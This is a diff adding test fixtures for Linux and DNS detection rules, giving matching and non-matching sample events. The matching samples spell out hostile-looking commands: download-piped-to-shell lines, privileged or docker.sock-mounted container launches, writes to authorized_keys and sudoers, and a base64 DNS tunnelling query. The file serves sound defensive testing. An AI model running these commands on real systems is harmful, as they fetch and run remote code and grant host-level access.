@@ -133,5 +133,150 @@
     "TargetFilename": "/tmp/dbus-helper.service"
    }
   ]
+ },
+ "lnx_proc_docker_container_with_host_level_access": {
+  "match": [
+   {
+    "Image": "/usr/bin/docker",
+    "CommandLine": "docker run -d --privileged alpine sleep 1d"
+   },
+   {
+    "Image": "/usr/bin/docker",
+    "CommandLine": "docker run -v /var/run/docker.sock:/var/run/docker.sock tool"
+   },
+   {
+    "Image": "/usr/bin/podman",
+    "CommandLine": "podman run --pid=host -it ubuntu bash"
+   },
+   {
+    "Image": "/usr/bin/docker",
+    "CommandLine": "docker create --cap-add=SYS_ADMIN img"
+   }
+  ],
+  "no_match": [
+   {
+    "Image": "/usr/bin/docker",
+    "CommandLine": "docker run -d -p 8080:80 nginx"
+   },
+   {
+    "Image": "/usr/bin/docker",
+    "CommandLine": "docker ps --filter label=--privileged"
+   },
+   {
+    "Image": "/usr/bin/vim",
+    "CommandLine": "vim notes-about --privileged run .txt"
+   }
+  ]
+ },
+ "lnx_file_event_ssh_authorized_keys_modified": {
+  "match": [
+   {
+    "Image": "/usr/bin/bash",
+    "TargetFilename": "/home/deploy/.ssh/authorized_keys"
+   },
+   {
+    "Image": "/usr/bin/curl",
+    "TargetFilename": "/root/.ssh/authorized_keys"
+   },
+   {
+    "Image": "/usr/bin/python3",
+    "TargetFilename": "/home/aaron/.ssh/authorized_keys2"
+   }
+  ],
+  "no_match": [
+   {
+    "Image": "/usr/bin/ssh-copy-id",
+    "TargetFilename": "/home/deploy/.ssh/authorized_keys"
+   },
+   {
+    "Image": "/usr/bin/bash",
+    "TargetFilename": "/home/deploy/.ssh/known_hosts"
+   },
+   {
+    "Image": "/usr/bin/bash",
+    "TargetFilename": "/tmp/authorized_keys"
+   }
+  ]
+ },
+ "lnx_file_event_sudoers_modified": {
+  "match": [
+   {
+    "Image": "/usr/bin/tee",
+    "TargetFilename": "/etc/sudoers.d/zz-backup"
+   },
+   {
+    "Image": "/usr/bin/bash",
+    "TargetFilename": "/etc/sudoers"
+   }
+  ],
+  "no_match": [
+   {
+    "Image": "/usr/sbin/visudo",
+    "TargetFilename": "/etc/sudoers"
+   },
+   {
+    "Image": "/usr/bin/dpkg",
+    "TargetFilename": "/etc/sudoers.d/90-cloud-init-users"
+   },
+   {
+    "Image": "/usr/bin/tee",
+    "TargetFilename": "/etc/sudoers.bak"
+   },
+   {
+    "Image": "/usr/bin/tee",
+    "TargetFilename": "/home/aaron/etc/sudoers.d/x"
+   }
+  ]
+ },
+ "lnx_proc_download_piped_to_shell": {
+  "match": [
+   {
+    "CommandLine": "curl -fsSL https://example.com/install.sh | sh"
+   },
+   {
+    "CommandLine": "wget -qO- http://203.0.113.9/a|bash"
+   },
+   {
+    "CommandLine": "bash -c \"$(curl -fsSL https://example.com/i.sh)\""
+   },
+   {
+    "CommandLine": "curl -s https://example.com/x.py | python3 -"
+   }
+  ],
+  "no_match": [
+   {
+    "CommandLine": "curl -fsSL https://example.com/install.sh -o install.sh"
+   },
+   {
+    "CommandLine": "cat notes.txt | sh"
+   },
+   {
+    "CommandLine": "wget https://example.com/file.tar.gz"
+   }
+  ]
+ },
+ "dns_query_very_long_label_possible_tunnelling": {
+  "match": [
+   {
+    "query": "dGhpcyBpcyBzb21lIGRhdGEgYmVpbmcgbW92ZWQgb3ZlciBkbnMgcXVlcmllcw.t.example.net."
+   },
+   {
+    "query": "aaaaaaaaaabbbbbbbbbbccccccccccddddddddddeeeeeeeeeeffff.chunk7.example.org."
+   }
+  ],
+  "no_match": [
+   {
+    "query": "www.example.com."
+   },
+   {
+    "query": "a-fairly-long-but-ordinary-hostname-for-a-service.example.com."
+   },
+   {
+    "query": "20260921._domainkey.example.com."
+   },
+   {
+    "query": "d1234567890abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuv.cloudfront.net"
+   }
+  ]
  }
 }
